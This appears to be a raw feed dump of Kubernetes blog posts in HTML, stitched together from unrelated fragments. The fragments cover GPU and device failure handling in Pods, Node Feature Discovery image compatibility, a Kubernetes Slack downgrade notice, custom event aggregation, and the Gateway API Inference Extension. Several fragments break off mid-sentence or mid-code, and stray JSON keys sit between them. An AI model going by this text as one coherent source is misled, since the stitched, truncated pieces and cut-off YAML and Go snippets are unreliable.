These\nworkloads often rely heavily on specialized hardware, and any device failure can\nsignificantly impact performance and lead to frustrating interruptions. As\nhighlighted in the 2024 <a href=\"https://ai.meta.com/research/publications/the-llama-3-herd-of-models/\">Llama\npaper</a>,\nhardware issues, particularly GPU failures, are a major cause of disruption in\nAI/ML training. You can also learn how much effort NVIDIA spends on handling\ndevices failures and maintenance in the KubeCon talk by <a href=\"https://kccncna2024.sched.com/event/1i7kJ/all-your-gpus-are-belong-to-us-an-inside-look-at-nvidias-self-healing-geforce-now-infrastructure-ryan-hallisey-piotr-prokop-pl-nvidia\">Ryan Hallisey and Piotr\nProkop All-Your-GPUs-Are-Belong-to-Us: An Inside Look at NVIDIA's Self-Healing\nGeForce NOW\nInfrastructure</a>\n(<a href=\"https://www.youtube.com/watch?v=iLnHtKwmu2I\">recording</a>) as they see 19\nremediation requests per 1000 nodes a day!\nWe also see data centers offering spot consumption models and overcommit on\npower, making device failures commonplace and a part of the business model.</p>\n<p>However, Kubernetes’s view on resources is still very static. The resource is\neither there or not. And if it is there, the assumption is that it will stay\nthere fully functional - Kubernetes lacks good support for handling full or partial\nhardware failures. These long-existing assumptions combined with the overall complexity of a setup lead\nto a variety of failure modes, which we discuss here.</p>\n<h3 id=\"understanding-ai-ml-workloads\">Understanding AI/ML workloads</h3>\n<p>Generally, all AI/ML workloads require specialized hardware, have challenging\nscheduling requirements, and are expensive when idle. AI/ML workloads typically\nfall into two categories - training and inference. Here is an oversimplified\nview of those categories’ characteristics, which are different from traditional workloads\nlike web services:</p>\n<dl>\n<dt>Training</dt>\n<dd>These workloads are resource-intensive, often consuming entire\nmachines and running as gangs of pods. Training jobs are usually &quot;run to\ncompletion&quot; - but that could be days, weeks or even months. Any failure in a\nsingle pod can necessitate restarting the entire step across all the pods.</dd>\n<dt>Inference</dt>\n<dd>These workloads are usually long-running or run indefinitely,\nand can be small enough to consume a subset of a Node’s devices or large enough to span\nmultiple nodes. They often require downloading huge files with the model\nweights.</dd>\n</dl>\n<p>These workload types specifically break many past assumptions:</p>\n<table><caption style=\"display: none;\">Workload assumptions before and now</caption>\n<thead>\n<tr>\n<th style=\"text-align: left;\">Before</th>\n<th style=\"text-align: left;\">Now</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\">Can get a better CPU and the app will work faster.</td>\n<td style=\"text-align: left;\">Require a <strong>specific</strong> device (or <strong>class of devices</strong>) to run.</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">When something doesn’t work, just recreate it.</td>\n<td style=\"text-align: left;\">Allocation or reallocation is expensive.</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Any node will work. No need to coordinate between Pods.</td>\n<td style=\"text-align: left;\">Scheduled in a special way - devices often connected in a cross-node topology.</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Each Pod can be plug-and-play replaced if failed.</td>\n<td style=\"text-align: left;\">Pods are a part of a larger task. Lifecycle of an entire task depends on each Pod.</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Container images are slim and easily available.</td>\n<td style=\"text-align: left;\">Container images may be so big that they require special handling.</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Long initialization can be offset by slow rollout.</td>\n<td style=\"text-align: left;\">Initialization may be long and should be optimized, sometimes across many Pods together.</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\">Compute nodes are commoditized and relatively inexpensive, so some idle time is acceptable.</td>\n<td style=\"text-align: left;\">Nodes with specialized hardware can be an order of magnitude more expensive than those without, so idle time is very wasteful.</td>\n</tr>\n</tbody>\n</table>\n<p>The existing failure model was relying on old assumptions. It may still work for\nthe new workload types, but it has limited knowledge about devices and is very\nexpensive for them. In some cases, even prohibitively expensive. You will see\nmore examples later in this article.</p>\n<h3 id=\"why-kubernetes-still-reigns-supreme\">Why Kubernetes still reigns supreme</h3>\n<p>This article is not going deeper into the question: why not start fresh for<br />\nAI/ML workloads since they are so different from the traditional Kubernetes\nworkloads. Despite many challenges, Kubernetes remains the platform of choice\nfor AI/ML workloads. Its maturity, security, and rich ecosystem of tools make it\na compelling option. While alternatives exist, they often lack the years of\ndevelopment and refinement that Kubernetes offers. And the Kubernetes developers\nare actively addressing the gaps identified in this article and beyond.</p>\n<h2 id=\"the-current-state-of-device-failure-handling\">The current state of device failure handling</h2>\n<p>This section outlines different failure modes and the best practices and DIY\n(Do-It-Yourself) solutions used today. The next session will describe a roadmap\nof improving things for those failure modes.</p>\n<h3 id=\"failure-modes-k8s-infrastructure\">Failure modes: K8s infrastructure</h3>\n<p>In order to understand the failures related to the Kubernetes infrastructure,\nyou need to understand how many moving parts are involved in scheduling a Pod on\nthe node. The sequence of events when the Pod is scheduled in the Node is as\nfollows:</p>\n<ol>\n<li><em>Device plugin</em> is scheduled on the Node</li>\n<li><em>Device plugin</em> is registered with the <em>kubelet</em> via local gRPC</li>\n<li><em>Kubelet</em> uses <em>device plugin</em> to watch for devices and updates capacity of\nthe node</li>\n<li><em>Scheduler</em> places a <em>user Pod</em> on a Node based on the updated capacity</li>\n<li><em>Kubelet</em> asks <em>Device plugin</em> to <strong>Allocate</strong> devices for a <em>User Pod</em></li>\n<li><em>Kubelet</em> creates a <em>User Pod</em> with the allocated devices attached to it</li>\n</ol>\n<p>This diagram shows some of those actors involved:</p>\n<figure>\n<img alt=\"The diagram shows relationships between the kubelet, Device plugin, and a user Pod. It shows that kubelet connects to the Device plugin named my-device, kubelet reports the node status with the my-device availability, and the user Pod requesting the 2 of my-device.\" src=\"https://kubernetes.io/blog/2025/07/03/navigating-failures-in-pods-with-devices/k8s-infra-devices.svg\" />\n</figure>\n<p>As there are so many actors interconnected, every one of them and every\nconnection may experience interruptions. This leads to many exceptional\nsituations that are often considered failures, and may cause serious workload\ninterruptions:</p>\n<ul>\n<li>Pods failing admission at various stages of its lifecycle</li>\n<li>Pods unable to run on perfectly fine hardware</li>\n<li>Scheduling taking unexpectedly long time</li>\n</ul>\n<figure>\n<img alt=\"The same diagram as one above it, however it has an overlayed orange bang drawings over individual components with the text indicating what can break in that component. Over the kubelet text reads: 'kubelet restart: looses all devices info before re-Watch'. Over the Device plugin text reads: 'device plugin update, evictIon, restart: kubelet cannot Allocate devices or loses all devices state'. Over the user Pod text reads: 'slow pod termination: devices are unavailable'.\" src=\"https://kubernetes.io/blog/2025/07/03/navigating-failures-in-pods-with-devices/k8s-infra-failures.svg\" />\n</figure>\n<p>The goal for Kubernetes is to make the interruption between these components as\nreliable as possible. Kubelet already implements retries, grace periods, and\nother techniques to improve it. The roadmap section goes into details on other\nedge cases that the Kubernetes project tracks. However, all these improvements\nonly work when these best practices are followed:</p>\n<ul>\n<li>Configure and restart kubelet and the container runtime (such as containerd or CRI-O)\nas early as possible to not interrupt the workload.</li>\n<li>Monitor device plugin health and carefully plan for upgrades.</li>\n<li>Do not overload the node with less-important workloads to prevent interruption\nof device plugin and other components.</li>\n<li>Configure user pods tolerations to handle node readiness flakes.</li>\n<li>Configure and code graceful termination logic carefully to not block devices\nfor too long.</li>\n</ul>\n<p>Another class of Kubernetes infra-related issues is driver-related. With\ntraditional resources like CPU and memory, no compatibility checks between the\napplication and hardware were needed. With special devices like hardware\naccelerators, there are new failure modes. Device drivers installed on the node:</p>\n<ul>\n<li>Must match the hardware</li>\n<li>Be compatible with an app</li>\n<li>Must work with other drivers (like <a href=\"https://developer.nvidia.com/nccl\">nccl</a>,\netc.)</li>\n</ul>\n<p>Best practices for handling driver versions:</p>\n<ul>\n<li>Monitor driver installer health</li>\n<li>Plan upgrades of infrastructure and Pods to match the version</li>\n<li>Have canary deployments whenever possible</li>\n</ul>\n<p>Following the best practices in this section and using device plugins and device\ndriver installers from trusted and reliable sources generally eliminate this\nclass of failures. Kubernetes is tracking work to make this space even better.</p>\n<h3 id=\"failure-modes-device-failed\">Failure modes: device failed</h3>\n<p>There is very little handling of device failure in Kubernetes today. Device\nplugins report the device failure only by changing the count of allocatable\ndevices. And Kubernetes relies on standard mechanisms like liveness probes or\ncontainer failures to allow Pods to communicate the failure condition to the\nkubelet. However, Kubernetes does not correlate device failures with container\ncrashes and does not offer any mitigation beyond restarting the container while\nbeing attached to the same device.</p>\n<p>This is why many plugins and DIY solutions exist to handle device failures based\non various signals.</p>\n<h4 id=\"health-controller\">Health controller</h4>\n<p>In many cases a failed device will result in unrecoverable and very expensive\nnodes doing nothing. A simple DIY solution is a <em>node health controller</em>. The\ncontroller could compare the device allocatable count with the capacity and if\nthe capacity is greater, it starts a timer. Once the timer reaches a threshold,\nthe health controller kills and recreates a node.</p>\n<p>There are problems with the <em>health controller</em> approach:</p>\n<ul>\n<li>Root cause of the device failure is typically not known</li>\n<li>The controller is not workload aware</li>\n<li>Failed device might not be in use and you want to keep other devices running</li>\n<li>The detection may be too slow as it is very generic</li>\n<li>The node may be part of a bigger set of nodes and simply cannot be deleted in\nisolation without other nodes</li>\n</ul>\n<p>There are variations of the health controller solving some of the problems\nabove. The overall theme here though is that to best handle failed devices, you\nneed customized handling for the specific workload. Kubernetes doesn’t yet offer\nenough abstraction to express how critical the device is for a node, for the\ncluster, and for the Pod it is assigned to.</p>\n<h4 id=\"pod-failure-policy\">Pod failure policy</h4>\n<p>Another DIY approach for device failure handling is a per-pod reaction on a\nfailed device. This approach is applicable for <em>training</em> workloads that are\nimplemented as Jobs.</p>\n<p>Pod can define special error codes for device failures. For example, whenever\nunexpected device behavior is encountered, Pod exits with a special exit code.\nThen the Pod failure policy can handle the device failure in a special way. Read\nmore on <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/job/#pod-failure-policy\">Handling retriable and non-retriable pod failures with Pod failure\npolicy</a></p>\n<p>There are some problems with the <em>Pod failure policy</em> approach for Jobs:</p>\n<ul>\n<li>There is no well-known <em>device failed</em> condition, so this approach does not work for the\ngeneric Pod case</li>\n<li>Error codes must be coded carefully and in some cases are hard to guarantee.</li>\n<li>Only works with Jobs with <code>restartPolicy: Never</code>, due to the limitation of a pod\nfailure policy feature.</li>\n</ul>\n<p>So, this solution has limited applicability.</p>\n<h4 id=\"custom-pod-watcher\">Custom pod watcher</h4>\n<p>A little more generic approach is to implement the Pod watcher as a DIY solution\nor use some third party tools offering this functionality. The pod watcher is\nmost often used to handle device failures for inference workloads.</p>\n<p>Since Kubernetes just keeps a pod assigned to a device, even if the device is\nreportedly unhealthy, the idea is to detect this situation with the pod watcher\nand apply some remediation. It often involves obtaining device health status and\nits mapping to the Pod using Pod Resources API on the node. If a device fails,\nit can then delete the attached Pod as a remediation. The replica set will\nhandle the Pod recreation on a healthy device.</p>\n<p>The other reasons to implement this watcher:</p>\n<ul>\n<li>Without it, the Pod will keep being assigned to the failed device forever.</li>\n<li>There is no <em>descheduling</em> for a pod with <code>restartPolicy=Always</code>.</li>\n<li>There are no built-in controllers that delete Pods in CrashLoopBackoff.</li>\n</ul>\n<p>Problems with the <em>custom pod watcher</em>:</p>\n<ul>\n<li>The signal for the pod watcher is expensive to get, and involves some\nprivileged actions.</li>\n<li>It is a custom solution and it assumes the importance of a device for a Pod.</li>\n<li>The pod watcher relies on external controllers to reschedule a Pod.</li>\n</ul>\n<p>There are more variations of DIY solutions for handling device failures or\nupcoming maintenance. Overall, Kubernetes has enough extension points to\nimplement these solutions. However, some extension points require higher\nprivilege than users may be comfortable with or are too disruptive. The roadmap\nsection goes into more details on specific improvements in handling the device\nfailures.</p>\n<h3 id=\"failure-modes-container-code-failed\">Failure modes: container code failed</h3>\n<p>When the container code fails or something bad happens with it, like out of\nmemory conditions, Kubernetes knows how to handle those cases. There is either\nthe restart of a container, or a crash of a Pod if it has <code>restartPolicy: Never</code>\nand scheduling it on another node. Kubernetes has limited expressiveness on what\nis a failure (for example, non-zero exit code or liveness probe failure) and how\nto react on such a failure (mostly either Always restart or immediately fail the\nPod).</p>\n<p>This level of expressiveness is often not enough for the complicated AI/ML\nworkloads. AI/ML pods are better rescheduled locally or even in-place as that\nwould save on image pulling time and device allocation. AI/ML pods are often\ninterconnected and need to be restarted together. This adds another level of\ncomplexity and optimizing it often brings major savings in running AI/ML\nworkloads.</p>\n<p>There are various DIY solutions to handle Pod failures orchestration. The most\ntypical one is to wrap a main executable in a container by some orchestrator.\nAnd this orchestrator will be able to restart the main executable whenever the\njob needs to be restarted because some other pod has failed.</p>\n<p>Solutions like this are very fragile and elaborate. They are often worth the\nmoney saved comparing to a regular JobSet delete/recreate cycle when used in\nlarge training jobs. Making these solutions less fragile and more streamlined\nby developing new hooks and extension points in Kubernetes will make it\neasy to apply to smaller jobs, benefiting everybody.</p>\n<h3 id=\"failure-modes-device-degradation\">Failure modes: device degradation</h3>\n<p>Not all device failures are terminal for the overall workload or batch job.\nAs the hardware stack gets more and more\ncomplex, misconfiguration on one of the hardware stack layers, or driver\nfailures, may result in devices that are functional, but lagging on performance.\nOne device that is lagging behind can slow down the whole training job.</p>\n<p>We see reports of such cases more and more often. Kubernetes has no way to\nexpress this type of failures today and since it is the newest type of failure\nmode, there is not much of a best practice offered by hardware vendors for\ndetection and third party tooling for remediation of these situations.</p>\n<p>Typically, these failures are detected based on observed workload\ncharacteristics. For example, the expected speed of AI/ML training steps on\nparticular hardware. Remediation for those issues is highly depend on a workload needs.</p>\n<h2 id=\"roadmap\">Roadmap</h2>\n<p>As outlined in a section above, Kubernetes offers a lot of extension points\nwhich are used to implement various DIY solutions. The space of AI/ML is\ndeveloping very fast, with changing requirements and usage patterns. SIG Node is\ntaking a measured approach of enabling more extension points to implement the\nworkload-specific scenarios over introduction of new semantics to support\nspecific scenarios. This means prioritizing making information about failures\nreadily available over implementing automatic remediations for those failures\nthat might only be suitable for a subset of workloads.</p>\n<p>This approach ensures there are no drastic changes for workload handling which\nmay break existing, well-oiled DIY solutions or experiences with the existing\nmore traditional workloads.</p>\n<p>Many error handling techniques used today work for AI/ML, but are very\nexpensive. SIG Node will invest in extension points to make those cheaper, with\nthe understanding that the price cutting for AI/ML is critical.</p>\n<p>The following is the set of specific investments we envision for various failure\nmodes.</p>\n<h3 id=\"roadmap-for-failure-modes-k8s-infrastructure\">Roadmap for failure modes: K8s infrastructure</h3>\n<p>The area of Kubernetes infrastructure is the easiest to understand and very\nimportant to make right for the upcoming transition from Device Plugins to DRA.\nSIG Node is tracking many work items in this area, most notably the following:</p>\n<ul>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/127460\">integrate kubelet with the systemd watchdog · Issue\n#127460</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/128696\">DRA: detect stale DRA plugin sockets · Issue\n#128696</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/127803\">Support takeover for devicemanager/device-plugin · Issue\n#127803</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/127457\">Kubelet plugin registration reliability · Issue\n#127457</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/128167\">Recreate the Device Manager gRPC server if failed · Issue\n#128167</a></li>\n<li><a href=\"https://github.com/kubernetes/kubernetes/issues/128043\">Retry pod admission on device plugin grpc failures · Issue\n#128043</a></li>\n</ul>\n<p>Basically, every interaction of Kubernetes components must be reliable via\neither the kubelet improvements or the best practices in plugins development\nand deployment.</p>\n<h3 id=\"roadmap-for-failure-modes-device-failed\">Roadmap for failure modes: device failed</h3>\n<p>For the device failures some patterns are already emerging in common scenarios\nthat Kubernetes can support. However, the very first step is to make information\nabout failed devices available easier. The very first step here is the work in\n<a href=\"https://kep.k8s.io/4680\">KEP 4680</a> (Add Resource Health Status to the Pod Status for\nDevice Plugin and DRA).</p>\n<p>Longer term ideas include to be tested:</p>\n<ul>\n<li>Integrate device failures into Pod Failure Policy.</li>\n<li>Node-local retry policies, enabling pod failure policies for Pods with\nrestartPolicy=OnFailure and possibly beyond that.</li>\n<li>Ability to <em>deschedule</em> pod, including with the <code>restartPolicy: Always</code>, so it can\nget a new device allocated.</li>\n<li>Add device health to the ResourceSlice used to represent devices in DRA,\nrather than simply withdrawing an unhealthy device from the ResourceSlice.</li>\n</ul>\n<h3 id=\"roadmap-for-failure-modes-container-code-failed\">Roadmap for failure modes: container code failed</h3>\n<p>The main improvements to handle container code failures for AI/ML workloads are\nall targeting cheaper error handling and recovery. The cheapness is mostly\ncoming from reuse of pre-allocated resources as much as possible. From reusing\nthe Pods by restarting containers in-place, to node local restart of containers\ninstead of rescheduling whenever possible, to snapshotting support, and\nre-scheduling prioritizing the same node to save on image pulls.</p>\n<p>Consider this scenario: A big training job needs 512 Pods to run. And one of the\npods failed. It means that all Pods need to be interrupted and synced up to\nrestart the failed step. The most efficient way to achieve this generally is to\nreuse as many Pods as possible by restarting them in-place, while replacing the\nfailed pod to clear up the error from it. Like demonstrated in this picture:</p>\n<figure>\n<img alt=\"The picture shows 512 pod, most ot them are green and have a recycle sign next to them indicating that they can be reused, and one Pod drawn in red, and a new green replacement Pod next to it indicating that it needs to be replaced.\" src=\"https://kubernetes.io/blog/2025/07/03/navigating-failures-in-pods-with-devices/inplace-pod-restarts.svg\" />\n</figure>\n<p>It is possible to implement this scenario, but all solutions implementing it are\nfragile due to lack of certain extension points in Kubernetes. Adding these\nextension points to implement this scenario is on the Kubernetes roadmap.</p>\n<h3 id=\"roadmap-for-failure-modes-device-degradation\">Roadmap for failure modes: device degradation</h3>\n<p>There is very little done in this area - there is no clear detection signal,\nvery limited troubleshooting tooling, and no built-in semantics to express the\n&quot;degraded&quot; device on Kubernetes. There has been discussion of adding data on\ndevice performance or degradation in the ResourceSlice used by DRA to represent\ndevices, but it is not yet clearly defined. There are also projects like\n<a href=\"https://github.com/medik8s/node-healthcheck-operator\">node-healthcheck-operator</a>\nthat can be used for some scenarios.</p>\n<p>We expect developments in this area from hardware vendors and cloud providers, and we expect to see mostly DIY\nsolutions in the near future. As more users get exposed to AI/ML workloads, this\nis a space needing feedback on patterns used here.</p>\n<h2 id=\"join-the-conversation\">Join the conversation</h2>\n<p>The Kubernetes community encourages feedback and participation in shaping the\nfuture of device failure handling.

      "summary": "<p>In industries where systems must run very reliably and meet strict performance criteria such as telecommunication, high-performance or AI computing, containerized applications often need specific operating system configuration or hardware presence.\nIt is common practice to require the use of specific versions of the kernel, its configuration, device drivers, or system components.\nDespite the existence of the <a href=\"https://opencontainers.org/\">Open Container Initiative (OCI)</a>, a governing community to define standards and specifications for container images, there has been a gap in expression of such compatibility requirements.\nThe need to address this issue has led to different proposals and, ultimately, an implementation in Kubernetes' <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/stable/get-started/index.html\">Node Feature Discovery (NFD)</a>.</p>\n<p><a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/stable/get-started/index.html\">NFD</a> is an open source Kubernetes project that automatically detects and reports <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/customization-guide.html#available-features\">hardware and system features</a> of cluster nodes. This information helps users to schedule workloads on nodes that meet specific system requirements, which is especially useful for applications with strict hardware or operating system dependencies.</p>\n<h2 id=\"the-need-for-image-compatibility-specification\">The need for image compatibility specification</h2>\n<h3 id=\"dependencies-between-containers-and-host-os\">Dependencies between containers and host OS</h3>\n<p>A container image is built on a base image, which provides a minimal runtime environment, often a stripped-down Linux userland, completely empty or distroless. When an application requires certain features from the host OS, compatibility issues arise. These dependencies can manifest in several ways:</p>\n<ul>\n<li><strong>Drivers</strong>:\nHost driver versions must match the supported range of a library version inside the container to avoid compatibility problems. Examples include GPUs and network drivers.</li>\n<li><strong>Libraries or Software</strong>:\nThe container must come with a specific version or range of versions for a library or software to run optimally in the environment. Examples from high performance computing are MPI, EFA, or Infiniband.</li>\n<li><strong>Kernel Modules or Features</strong>:\nSpecific kernel features or modules must be present. Examples include having support of write protected huge page faults, or the presence of VFIO</li>\n<li>And more…</li>\n</ul>\n<p>While containers in Kubernetes are the most likely unit of abstraction for these needs, the definition of compatibility can extend further to include other container technologies such as Singularity and other OCI artifacts such as binaries from a spack binary cache.</p>\n<h3 id=\"multi-cloud-and-hybrid-cloud-challenges\">Multi-cloud and hybrid cloud challenges</h3>\n<p>Containerized applications are deployed across various Kubernetes distributions and cloud providers, where different host operating systems introduce compatibility challenges.\nOften those have to be pre-configured before workload deployment or are immutable.\nFor instance, different cloud providers will include different operating systems like:</p>\n<ul>\n<li><strong>RHCOS/RHEL</strong></li>\n<li><strong>Photon OS</strong></li>\n<li><strong>Amazon Linux 2</strong></li>\n<li><strong>Container-Optimized OS</strong></li>\n<li><strong>Azure Linux OS</strong></li>\n<li>And more...</li>\n</ul>\n<p>Each OS comes with unique kernel versions, configurations, and drivers, making compatibility a non-trivial issue for applications requiring specific features.\nIt must be possible to quickly assess a container for its suitability to run on any specific environment.</p>\n<h3 id=\"image-compatibility-initiative\">Image compatibility initiative</h3>\n<p>An effort was made within the <a href=\"https://github.com/opencontainers/wg-image-compatibility\">Open Containers Initiative Image Compatibility</a> working group to introduce a standard for image compatibility metadata.\nA specification for compatibility would allow container authors to declare required host OS features, making compatibility requirements discoverable and programmable.\nThe specification implemented in Kubernetes Node Feature Discovery is one of the discussed proposals.\nIt aims to:</p>\n<ul>\n<li><strong>Define a structured way to express compatibility in OCI image manifests.</strong></li>\n<li><strong>Support a compatibility specification alongside container images in image registries.</strong></li>\n<li><strong>Allow automated validation of compatibility before scheduling containers.</strong></li>\n</ul>\n<p>The concept has since been implemented in the Kubernetes Node Feature Discovery project.</p>\n<h3 id=\"implementation-in-node-feature-discovery\">Implementation in Node Feature Discovery</h3>\n<p>The solution integrates compatibility metadata into Kubernetes via NFD features and the <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/custom-resources.html#nodefeaturegroup\">NodeFeatureGroup</a> API.\nThis interface enables the user to match containers to nodes based on exposing features of hardware and software, allowing for intelligent scheduling and workload optimization.</p>\n<h3 id=\"compatibility-specification\">Compatibility specification</h3>\n<p>The compatibility specification is a structured list of compatibility objects containing <em><a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/custom-resources.html#nodefeaturegroup\">Node Feature Groups</a></em>.\nThese objects define image requirements and facilitate validation against host nodes.\nThe feature requirements are described by using <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/customization-guide.html#available-features\">the list of available features</a> from the NFD project.\nThe schema has the following structure:</p>\n<ul>\n<li><strong>version</strong> (string) - Specifies the API version.</li>\n<li><strong>compatibilities</strong> (array of objects) - List of compatibility sets.\n<ul>\n<li><strong>rules</strong> (object) - Specifies <a href=\"https://kubernetes-sigs.github.io/node-feature-discovery/v0.17/usage/custom-resources.html#nodefeaturegroup\">NodeFeatureGroup</a> to define image requirements.</li>\n<li><strong>weight</strong> (int, optional) - Node affinity weight.</li>\n<li><strong>tag</strong> (string, optional) - Categorization tag.</li>\n<li><strong>description</strong> (string, optional) - Short description.</li>\n</ul>\n</li>\n</ul>\n<p>An example might look like the following:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

Stand by for more details, but for now, there is no urgency to back up private channels or direct messages.</p>\n<p><del>Kubernetes Slack will lose its special status and will be changing into a standard free Slack on June 20, 2025</del>. Sometime later this year, our community may move to a new platform. If you are responsible for a channel or private channel, or a member of a User Group, you will need to take some actions as soon as you can.</p>\n<p>For the last decade, Slack has supported our project with a free customized enterprise account. They have let us know that they can no longer do so, particularly since our Slack is one of the largest and more active ones on the platform. As such, they will be downgrading it to a standard free Slack while we decide on, and implement, other options.</p>\n<p>On Friday, June 20, we will be subject to the <a href=\"https://slack.com/help/articles/27204752526611-Feature-limitations-on-the-free-version-of-Slack\">feature limitations of free Slack</a>. The primary ones which will affect us will be only retaining 90 days of history, and having to disable several apps and workflows which we are currently using. The Slack Admin team will do their best to manage these limitations.</p>\n<p>Responsible channel owners, members of private channels, and members of User Groups should <a href=\"https://github.com/kubernetes/community/blob/master/communication/slack-migration-faq.md#what-actions-do-channel-owners-and-user-group-members-need-to-take-soon\">take some actions</a> to prepare for the upgrade and preserve information as soon as possible.</p>\n<p>The CNCF Projects Staff have proposed that our community look at migrating to Discord. Because of existing issues where we have been pushing the limits of Slack, they have already explored what a Kubernetes Discord would look like. Discord would allow us to implement new tools and integrations which would help the community, such as GitHub group membership synchronization. The Steering Committee will discuss and decide on our future platform.</p>\n<p>Please see our <a href=\"https://github.com/kubernetes/community/blob/master/communication/slack-migration-faq.md\">FAQ</a>, and check the <a href=\"https://groups.google.com/a/kubernetes.io/g/dev/\">kubernetes-dev mailing list</a> and the <a href=\"https://kubernetes.slack.com/archives/C9T0QMNG4\">#announcements channel</a> for further news.

This blog post explores how to build custom event aggregation systems that help engineering teams better understand cluster behavior and troubleshoot issues more effectively.</p>\n<h2 id=\"the-challenge-with-kubernetes-events\">The challenge with Kubernetes events</h2>\n<p>In a Kubernetes cluster, events are generated for various operations - from pod scheduling and container starts to volume mounts and network configurations. While these events are invaluable for debugging and monitoring, several challenges emerge in production environments:</p>\n<ol>\n<li><strong>Volume</strong>: Large clusters can generate thousands of events per minute</li>\n<li><strong>Retention</strong>: Default event retention is limited to one hour</li>\n<li><strong>Correlation</strong>: Related events from different components are not automatically linked</li>\n<li><strong>Classification</strong>: Events lack standardized severity or category classifications</li>\n<li><strong>Aggregation</strong>: Similar events are not automatically grouped</li>\n</ol>\n<p>To learn more about Events in Kubernetes, read the <a href=\"https://kubernetes.io/docs/reference/kubernetes-api/cluster-resources/event-v1/\">Event</a> API reference.</p>\n<h2 id=\"real-world-value\">Real-World value</h2>\n<p>Consider a production environment with tens of microservices where the users report intermittent transaction failures:</p>\n<p><strong>Traditional event aggregation process:</strong> Engineers are wasting hours sifting through thousands of standalone events spread across namespaces. By the time they look into it, the older events have long since purged, and correlating pod restarts to node-level issues is practically impossible.</p>\n<p><strong>With its event aggregation in its custom events:</strong> The system groups events across resources, instantly surfacing correlation patterns such as volume mount timeouts before pod restarts. History indicates it occurred during past record traffic spikes, highlighting a storage scalability issue in minutes rather than hours.</p>\n<p>The beneﬁt of this approach is that organizations that implement it commonly cut down their troubleshooting time significantly along with increasing the reliability of systems by detecting patterns early.</p>\n<h2 id=\"building-an-event-aggregation-system\">Building an Event aggregation system</h2>\n<p>This post explores how to build a custom event aggregation system that addresses these challenges, aligned to Kubernetes best practices. I've picked the Go programming language for my example.</p>\n<h3 id=\"architecture-overview\">Architecture overview</h3>\n<p>This event aggregation system consists of three main components:</p>\n<ol>\n<li><strong>Event Watcher</strong>: Monitors the Kubernetes API for new events</li>\n<li><strong>Event Processor</strong>: Processes, categorizes, and correlates events</li>\n<li><strong>Storage Backend</strong>: Stores processed events for longer retention</li>\n</ol>\n<p>Here's a sketch for how to implement the event watcher:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-go\"><span style=\"display: flex;\"><span><span style=\"color: #a2f;

      "summary": "<p>Modern generative AI and large language model (LLM) services create unique traffic-routing challenges\non Kubernetes. Unlike typical short-lived, stateless web requests, LLM inference sessions are often\nlong-running, resource-intensive, and partially stateful. For example, a single GPU-backed model server\nmay keep multiple inference sessions active and maintain in-memory token caches.</p>\n<p>Traditional load balancers focused on HTTP path or round-robin lack the specialized capabilities needed\nfor these workloads. They also don’t account for model identity or request criticality (e.g., interactive\nchat vs. batch jobs). Organizations often patch together ad-hoc solutions, but a standardized approach\nis missing.</p>\n<h2 id=\"gateway-api-inference-extension\">Gateway API Inference Extension</h2>\n<p><a href=\"https://gateway-api-inference-extension.sigs.k8s.io/\">Gateway API Inference Extension</a> was created to address\nthis gap by building on the existing <a href=\"https://gateway-api.sigs.k8s.io/\">Gateway API</a>, adding inference-specific\nrouting capabilities while retaining the familiar model of Gateways and HTTPRoutes. By adding an inference\nextension to your existing gateway, you effectively transform it into an <strong>Inference Gateway</strong>, enabling you to\nself-host GenAI/LLMs with a “model-as-a-service” mindset.</p>\n<p>The project’s goal is to improve and standardize routing to inference workloads across the ecosystem. Key\nobjectives include enabling model-aware routing, supporting per-request criticalities, facilitating safe model\nroll-outs, and optimizing load balancing based on real-time model metrics. By achieving these, the project aims\nto reduce latency and improve accelerator (GPU) utilization for AI workloads.</p>\n<h2 id=\"how-it-works\">How it works</h2>\n<p>The design introduces two new Custom Resources (CRDs) with distinct responsibilities, each aligning with a\nspecific user persona in the AI/ML serving workflow​:</p>\n<figure class=\"diagram-large clickable-zoom\">\n<img alt=\"Resource Model\" src=\"https://kubernetes.io/blog/2025/06/05/introducing-gateway-api-inference-extension/inference-extension-resource-model.png\" />\n</figure>\n<ol>\n<li>\n<p><a href=\"https://gateway-api-inference-extension.sigs.k8s.io/api-types/inferencepool/\">InferencePool</a>\nDefines a pool of pods (model servers) running on shared compute (e.g., GPU nodes). The platform admin can\nconfigure how these pods are deployed, scaled, and balanced. An InferencePool ensures consistent resource\nusage and enforces platform-wide policies. An InferencePool is similar to a Service but specialized for AI/ML\nserving needs and aware of the model-serving protocol.</p>\n</li>\n<li>\n<p><a href=\"https://gateway-api-inference-extension.sigs.k8s.io/api-types/inferencemodel/\">InferenceModel</a>\nA user-facing model endpoint managed by AI/ML owners. It maps a public name (e.g., &quot;gpt-4-chat&quot;) to the actual\nmodel within an InferencePool. This lets workload owners specify which models (and optional fine-tuning) they\nwant served, plus a traffic-splitting or prioritization policy.</p>\n</li>\n</ol>\n<p>In summary, the InferenceModel API lets AI/ML owners manage what is served, while the InferencePool lets platform\noperators manage where and how it’s served.</p>\n<h2 id=\"request-flow\">Request flow</h2>\n<p>The flow of a request builds on the Gateway API model (Gateways and HTTPRoutes) with one or more extra inference-aware\nsteps (extensions) in the middle. Here’s a high-level example of the request flow with the\n<a href=\"https://gateway-api-inference-extension.sigs.k8s.io/#endpoint-selection-extension\">Endpoint Selection Extension 